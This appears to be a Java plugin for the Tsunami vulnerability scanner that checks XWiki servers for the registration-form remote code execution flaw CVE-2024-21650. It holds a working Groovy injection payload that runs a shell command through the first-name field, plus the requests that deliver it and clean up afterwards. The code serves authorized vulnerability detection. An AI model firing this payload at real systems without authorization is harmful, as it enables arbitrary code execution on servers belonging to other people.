package com.google.tsunami.plugins.detectors.rce.cve202421650;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.*;

import javax.inject.Inject;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import static com.google.tsunami.common.net.http.HttpRequest.put;
import static java.nio.charset.StandardCharsets.UTF_8;

/** A {@link VulnDetector} that detects XWiki RCE CVE-2024-21650. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "XWiki RCE CVE-2024-21650 Detector",
    version = "0.1",
    description = "This detector checks user XWiki registration feature for RCE (CVE-2024-21650).",
    author = "yuradoc (yuradoc.research@gmail.com)",
    bootstrapModule = Cve202421650DetectorBootstrapModule.class)
public final class Cve202421650Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final String REQUEST_PATH = "bin/register/XWiki/XWikiRegister";

  private static final String PAYLOAD_PLACEHOLDER =
      "]]{{/html}}{{async}}{{groovy}}"
              + "Runtime.getRuntime().exec(\"{{PAYLOAD}}\")"
              + "{{/groovy}}{{/async}}";

  private static final String REQUEST_USER_NAME =
      "test" + Long.toHexString(Double.doubleToLongBits(Math.random()));

  private static final String REQUEST_USER_PASSWORD =
      Long.toHexString(Double.doubleToLongBits(Math.random()))
          + Long.toHexString(Double.doubleToLongBits(Math.random()));

  private static final Pattern CSRF_TOKEN_PATTERN =
      Pattern.compile("form_token\" value=\"(.*?)\" />");

  private static final String REQUEST_POST_DATA =
      "parent=xwiki:Main.UserDirectory&register_first_name="
          + PAYLOAD_PLACEHOLDER
          + "&register_last_name=&xwikiname="
          + REQUEST_USER_NAME
          + "&register_password="
          + REQUEST_USER_PASSWORD
          + "&register2_password="
          + REQUEST_USER_PASSWORD
          + "&register_email="
          + "&form_token={{TOKEN}}";

  @VisibleForTesting
  static final String RESPONSE_STRING =
      "XWiki." + REQUEST_USER_NAME + "]] (" + REQUEST_USER_NAME + ")";

  private static final String REQUEST_CLEANUP_PATH =
      "rest/wikis/xwiki/spaces/XWiki/pages/" + REQUEST_USER_NAME + "/objects/XWiki.XWikiUsers/0";

  private static final String REQUEST_CLEANUP_FIRST_NAME_REPLACEMENT = "Delete Me!";

  private final Clock utcClock;
  private final HttpClient httpClient;

  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve202421650Detector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve202421650Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + REQUEST_PATH;

    String targetCleanupUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + REQUEST_CLEANUP_PATH;

    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = payloadGenerator.generate(config);
    String cmd = payload.getPayload();

    String token = "";

    try {
      HttpResponse response =
          httpClient.send(get(targetUri).withEmptyHeaders().build(), networkService);
      if (response.status().code() != HttpStatus.OK.code()) {
        return false;
      }

      Matcher csrfTokenMatcher = CSRF_TOKEN_PATTERN.matcher(response.bodyString().orElse(""));
      if (csrfTokenMatcher.find()) {
        token = csrfTokenMatcher.group(1);
      }

      if (token.isEmpty()) {
        return false;
      }

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to request '%s'.", targetUri);
    }

    String requestBody = REQUEST_POST_DATA;

    String[] placeholders = {"{{PAYLOAD}}", "{{TOKEN}}"};

    String[] replacements = {cmd, token};

    for (int i = 0; i < placeholders.length; i++) {
      requestBody = requestBody.replace(placeholders[i], replacements[i]);
    }

    try {
      HttpResponse response =
          httpClient.send(
              post(targetUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader("Content-Type", "application/x-www-form-urlencoded")
                          .build())
                  .setRequestBody(ByteString.copyFromUtf8(requestBody))
                  .build(),
              networkService);

      httpClient.send(
          put(targetCleanupUri)
              .setHeaders(
                  HttpHeaders.builder()
                      .addHeader("Content-Type", "application/x-www-form-urlencoded")
                      .addHeader("Accept", "application/xml")
                      .addHeader(
                          "Authorization",
                          "Basic "
                              + Base64.getEncoder()
                                  .encodeToString(
                                      (REQUEST_USER_NAME + ":" + REQUEST_USER_PASSWORD)
                                          .getBytes(UTF_8)))
                      .build())
              .setRequestBody(
                  ByteString.copyFromUtf8(
                      "className=XWiki.XWikiUsers&property#first_name="
                          + REQUEST_CLEANUP_FIRST_NAME_REPLACEMENT))
              .build(),
          networkService);

      if (response.bodyString().isPresent()
              && (payloadGenerator.isCallbackServerEnabled() && payload.checkIfExecuted())
          || response.bodyString().get().contains(RESPONSE_STRING)) {
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to request '%s'.", targetUri);
    }
    return false;
  }

  public DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2024-21650"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("XWiki RCE (CVE-2024-21650)")
                .setDescription(
                    "XWiki is vulnerable to a remote code execution (RCE) attack through its user "
                        + "registration feature. This issue allows an attacker to execute "
                        + "arbitrary code by crafting malicious payloads in the \"first name\" "
                        + "or \"last name\" fields during user registration. This impacts all "
                        + "installations that have user registration enabled for guests. This "
                        + "vulnerability has been patched in XWiki 14.10.17, 15.5.3 "
                        + "and 15.8 RC1."))
        .build();
  }
}
